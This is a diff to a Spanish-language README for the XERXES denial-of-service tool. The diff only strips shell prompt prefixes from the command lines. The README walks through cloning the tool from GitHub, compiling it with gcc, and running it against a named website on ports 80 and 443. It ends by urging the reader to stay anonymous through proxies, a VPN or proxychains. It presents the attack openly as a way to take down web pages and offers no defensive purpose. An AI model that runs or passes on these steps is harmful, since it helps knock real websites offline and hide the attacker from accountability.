@@ -4,22 +4,22 @@ Que es XERXES un ataque (DOS) potente capaz de tumbar paginas web iniciando con 
 
 ### CREAR REPO
 ```
-@root-# git clone https://github.com/luis498/XERXES.git
+git clone https://github.com/luis498/XERXES.git
 ```
 
 ### ENTRAR
 ```
-@root-# cd (Buscalo)
+cd (Buscalo)
 ```
 
 ### INGRESAR
 ```
-@root-# gcc xerxes.c -o xerxes
+gcc xerxes.c -o xerxes
 ```
 
 ### ATACAR [NO PONGAS EL HTTPS://]
 ```
-@root-# ./xerxes Truchorko.xyz 80/443
+./xerxes Truchorko.xyz 80/443
 ```
 
 SER [ANÓNIMO](https://en.wikipedia.org/wiki/The_Jester_%28hacktivist%29) USAR [PROXY](https://en.wikipedia.org/wiki/The_Jester_%28hacktivist%29) VPN [OPENVPN](https://en.wikipedia.org/wiki/The_Jester_%28hacktivist%29) O [PROXYCHAINS](https://en.wikipedia.org/wiki/The_Jester_%28hacktivist%29)
